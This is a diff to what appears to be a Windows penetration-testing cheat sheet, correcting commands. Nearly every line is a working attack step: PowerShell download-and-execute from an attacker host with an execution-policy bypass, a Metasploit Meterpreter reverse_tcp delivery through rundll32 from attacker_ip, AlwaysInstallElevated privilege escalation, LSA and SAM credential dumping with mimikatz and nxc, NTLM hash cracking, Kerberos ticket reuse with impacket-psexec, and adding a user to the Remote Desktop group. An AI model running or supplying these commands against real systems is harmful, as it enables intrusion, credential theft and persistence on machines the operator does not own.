@@ -309,13 +309,13 @@ $buf = [Byte[]] (0x48,0x31,0xc9)
 Save as `patch.ps1` download and run like:
 
 ```powershell
-powershell -ep bypass -c "wget 'http://xxx.xxx.xxx.20:7777/patch.ps1' -O patch.ps1; .\patch.ps1 ");
+powershell -ep bypass -c "wget 'http://xxx.xxx.xxx.20:7777/patch.ps1' -O patch.ps1; .\patch.ps1 "
 ```
 
 Then any other payload script can be run:
 
 ```powershell
-powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx.20:7777/PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx.20:7777/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
 ```
 
 ## Download and Upload stuff
@@ -686,7 +686,7 @@ Get-ChildItem C:\temp\ -Recurse | Get-Acl
 ### Exploiting .msi with AlwaysInstallElevated
 
 1. Detect
-`winpeas.exe  quite windowscreds`
+`winpeas.exe  quiet windowscreds`
 
 2. If `AlwaysInstallElevated set to 1 in HKLM or HKCU!` then it is exploitable
 
@@ -797,9 +797,9 @@ OR user mimikatz
 lsadump::lsa /patch
 
 ```
-`cme smb ms01.xxx.xxx -u Administrator -p xxx  --lsa --local-auth`
+`nxc smb ms01.xxx.xxx -u Administrator -p xxx  --lsa --local-auth`
 
-`cme smb ms01.xxx.xxx -u Administrator -p xxx  --sam --local-auth`
+`nxc smb ms01.xxx.xxx -u Administrator -p xxx  --sam --local-auth`
 
 * crack NTLM if needed `hashcat -m 1000 --force hash /wordlist`
 
@@ -995,7 +995,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 tr -d '\n' < ticket.64 | tr -d ' '
 
 # then just use ccache and call impackets psexec
-impacket-psexe -no-pass -k target cmd
+impacket-psexec -no-pass -k target cmd
 
 
 ```
@@ -1093,7 +1093,7 @@ New-PSSession -ComputerName 192.168.xx.xx -Credential $credential
 ## Meterpreter
 This shell works even on Windows 11 but needs MSF
 
-1. SMB delivery: `use windows/smb/smb/delivery`
+1. SMB delivery: `use exploit/windows/smb/smb_delivery`
 2. Payload: `set payload windows/meterpreter/reverse_tcp`
 3. Configure all options in MSF and `exploit`
 4. During exploit execution MSF will ask you to run following on target machine: `rundll32.exe \\attacker_ip\PJSK\test.dll,0`
@@ -1215,7 +1215,7 @@ net localgroup "Пользователи удаленного рабочего �
 
 # add to RDP group
 
-powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""
+powershell -nop -c "Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'Pentester'"
 
 net localgroup "Remote Desktop Users" Pentester /add
 
